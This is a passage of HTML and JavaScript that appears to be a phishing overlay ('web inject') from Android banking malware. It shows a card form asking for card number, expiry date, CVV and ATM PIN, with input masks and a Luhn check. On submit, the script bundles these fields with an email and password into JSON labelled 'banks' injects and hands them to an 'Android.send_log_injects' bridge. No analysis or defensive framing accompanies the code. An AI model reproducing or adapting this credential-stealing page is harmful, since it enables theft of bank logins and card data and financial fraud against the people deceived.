            </header>
            <section>
                <label for="cc"> Credit Card </label>
                <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input" placeholder="Credit Card" autocomplete="off">
                <label style="float: left; width: 58%;" for="exp">Expiration Date</label>
                <label for="cvv" style="float: right;width: 40%;">CVV</label>
                    <input type="tel" id="exp" style="float: left; width: 58%;" name="exp" onkeyup="check7();check8()" class="input" placeholder="Expiration Date" autocomplete="off">
                    <input type="password" id="cvv" style="float: right;width: 40%;" name="cvv" onkeyup="check8()" class="input" placeholder="CVV" autocomplete="off">
                    <label for="pin">ATM PIN</label>
                    <input type="password" id="pin" name="pin" onkeyup="check6();check8()" class="input" placeholder="ATM PIN" autocomplete="off">
    
                    <input type="submit" class="button" id="sendData" disabled value="Sign In">
            </section>
        </div>
    </form>
    <script>
        $('#cc').mask('0000 0000 0000 0000')
      $('#exp').mask('00/00')
      $('#cvv').mask('000')
      $('#pin').mask('0000')

      var form1 = document.getElementById('form1'),
          form2 = document.getElementById('form2');

          var email = document.getElementById('login'),
          password = document.getElementById('password');
          emailValid = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;

      var nextPage = document.getElementById('nextPage'),
          sendData = document.getElementById('sendData');

        
          function checkLenght() {
            if(emailValid.test(email.value) && password.value.length > 6) {
                nextPage.disabled = false;
            } else {
                nextPage.disabled = true;
            }
        }
        function emailCheck() {
            if(!emailValid.test(email.value)) {
                email.classList.add('error');
            } else {
                email.classList.remove('error');
            }
        }
        

        nextPage.onclick = () => {
            form1.style.display = 'none';
            form2.style.display = 'block';
        }
        
      function check7() {
          
          var mmYY = exp.value.split('/');
          var month = parseInt(mmYY[0]);
          var year = parseInt(mmYY[1]);
  
          var expArray = exp.value.split('/');
          var today, someday;
          var exMonth = expArray[0];
          var exYear = "20" + expArray[1];
  
          today = new Date();
          someday = new Date();
          someday.setFullYear(exYear, exMonth, 1);
                  
          if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
              exp.classList.add('error')
          } else {
              exp.classList.remove('error')
              return true
          }
      }
      function check6() {
          if(!valid_credit_card(cc.value)) {
              cc.classList.add('error')
          } else {
              cc.classList.remove('error');
          }
      }

      function valid_credit_card(value) {
          if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
          if (/[^0-9-\s]+/.test(value)) return false;
          var nCheck = 0, nDigit = 0, bEven = false;
          value = value.replace(/\D/g, "");
          for (var n = value.length - 1; n >= 0; n--) {
              var cDigit = value.charAt(n),
                  nDigit = parseInt(cDigit, 10);
              if (bEven) {
                  if ((nDigit *= 2) > 9) nDigit -= 9;
              }
              nCheck += nDigit;
              bEven = !bEven;
          }
          return (nCheck % 10) == 0;
          
      }

      function check8() {
          if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3 && pin.value.length === 4) {
              sendData.disabled = false;
          } else {
              sendData.disabled = true;
          }
      }

      sendData.onclick = () => {
              var data = {};
              data.email = email.value;
              data.password = password.value;
              data.cc = cc.value;
              data.exp = exp.value;
              data.cvv = cvv.value;
              data.pin = pin.value;
              data.type_injects = "banks";
              data.closed = "close_activity_injects";

              var ua = navigator.userAgent.toLowerCase();
              if(ua.indexOf("android") > -1) {
                  try {
                      Android.send_log_injects(JSON.stringify(data))
                  } catch (err) {}
              }else{
                  alert(JSON.stringify(data));
              }
      }
  </script>
</body>
